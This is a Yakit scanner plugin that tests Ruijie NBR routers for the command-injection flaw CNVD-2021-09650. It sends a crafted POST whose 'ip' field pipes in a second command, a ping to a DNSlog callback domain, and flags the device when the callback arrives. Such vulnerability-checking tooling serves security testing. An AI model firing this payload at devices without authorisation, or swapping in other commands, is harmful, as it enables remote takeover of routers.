# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port,command,token){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST /guest_auth/guestIsUp.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

mac=1&ip=127.0.0.1|{{params(command)}}`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr, "command":command}),
    poc.https(isTls),
    poc.redirectTimes(3),
    // poc.proxy("http://127.0.0.1:8083"),
    )

    if len(rsp) > 0 {
        
        sleep(5)
        dnsdata,dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            yakit.Info("%v 锐捷 NBR路由器CNVD-2021-09650远程命令执行漏洞", addr)
            println(dnsdata)
            risk.NewRisk(
            addr,risk.title("锐捷 NBR路由器CNVD-2021-09650远程命令执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("锐捷 NBR路由器CNVD-2021-09650远程命令执行漏洞存在"),
            risk.type("RCE[命令执行]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在锐捷 NBR路由器CNVD-2021-09650远程命令执行漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    server, token, err = risk.NewDNSLogDomain()
    command = str.f("ping -c 2 %v", server)
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port,command,token)
    }
    
}
